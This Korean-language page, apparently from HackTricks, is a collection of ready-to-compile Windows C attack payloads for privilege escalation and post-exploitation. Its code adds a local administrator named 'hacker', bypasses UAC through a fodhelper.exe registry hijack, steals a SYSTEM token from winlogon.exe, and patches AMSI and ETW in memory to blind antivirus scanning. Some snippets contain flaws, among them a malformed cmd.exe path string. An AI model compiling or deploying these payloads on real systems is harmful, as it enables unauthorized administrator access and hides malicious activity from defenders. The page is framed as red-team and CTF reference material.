# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 Windows 로컬 권한 상승 또는 사후 활용 중에 유용한 **작고 독립적인 C 코드 조각**을 모은 것입니다. 각 페이로드는 **복사-붙여넣기 친화적**으로 설계되었으며, Windows API / C 런타임만 필요하고 `i686-w64-mingw32-gcc` (x86) 또는 `x86_64-w64-mingw32-gcc` (x64)로 컴파일할 수 있습니다.

> ⚠️  이 페이로드는 프로세스가 이미 작업을 수행하는 데 필요한 최소 권한(예: `SeDebugPrivilege`, `SeImpersonatePrivilege` 또는 UAC 우회를 위한 중간 무결성 컨텍스트)을 가지고 있다고 가정합니다. 이들은 취약점을 이용하여 임의의 네이티브 코드 실행이 가능한 **레드팀 또는 CTF 환경**을 위해 설계되었습니다.

---

## Add local administrator user
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC 우회 – `fodhelper.exe` 레지스트리 하이재킹 (중간 → 높은 무결성)
신뢰할 수 있는 바이너리 **`fodhelper.exe`** 가 실행될 때, 필터링 없이 아래의 레지스트리 경로를 조회합니다 **`DelegateExecute` 동사**. 해당 키 아래에 우리의 명령을 심음으로써 공격자는 파일을 디스크에 드롭하지 않고 UAC를 우회할 수 있습니다.

*`fodhelper.exe`에 의해 조회된 레지스트리 경로*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
최소한의 PoC로 상승된 `cmd.exe`를 실행합니다:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 및 Windows 11 23H2(2025년 7월 패치)에서 테스트됨. Microsoft가 `DelegateExecute` 경로의 누락된 무결성 검사를 수정하지 않았기 때문에 우회가 여전히 작동합니다.*

---

## 토큰 중복을 통한 SYSTEM 셸 생성 (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
현재 프로세스가 **둘 다** `SeDebug` 및 `SeImpersonate` 권한을 보유하고 있는 경우(많은 서비스 계정에서 일반적), `winlogon.exe`에서 토큰을 훔쳐서 복제하고 상승된 프로세스를 시작할 수 있습니다:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
더 깊은 설명은 다음을 참조하십시오:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## 인메모리 AMSI 및 ETW 패치 (방어 회피)
대부분의 현대 AV/EDR 엔진은 악성 행동을 검사하기 위해 **AMSI**와 **ETW**에 의존합니다. 현재 프로세스 내에서 두 인터페이스를 조기에 패치하면 스크립트 기반 페이로드(예: PowerShell, JScript)가 스캔되는 것을 방지할 수 있습니다.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*위의 패치는 프로세스 로컬입니다; 이를 실행한 후 새로운 PowerShell을 생성하면 AMSI/ETW 검사가 없이 실행됩니다.*

---

## References
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
